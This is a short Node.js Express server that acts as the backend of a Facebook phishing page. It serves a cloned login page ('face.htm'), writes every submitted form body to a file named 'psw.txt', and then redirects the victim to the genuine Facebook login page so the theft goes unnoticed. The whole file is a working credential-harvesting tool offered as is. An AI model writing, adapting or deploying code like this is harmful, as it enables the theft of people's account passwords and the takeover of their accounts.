var express = require('express');
var app = express();
var path = require('path');
var fs = require('fs');
var bodyParser = require('body-parser');

app.use(bodyParser.urlencoded({
    extended: false
}))
app.use(bodyParser.json())

app.get('/', function (req, res) {
    res.sendFile(path.join(__dirname + '/face.htm'));
});

app.get('/face_files/:id', function (req, res) {
    res.sendFile(path.join(__dirname + '/face_files/' + req.params.id));
});

app.post('/s', function (req, res) {
    fs.appendFile(
        __dirname + '/psw.txt',
        JSON.stringify(req.body) + '\n\n',
        (e) => {console.log(e);}
    );
    res.redirect('https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110');
});

app.listen(process.env.PORT || 5000);
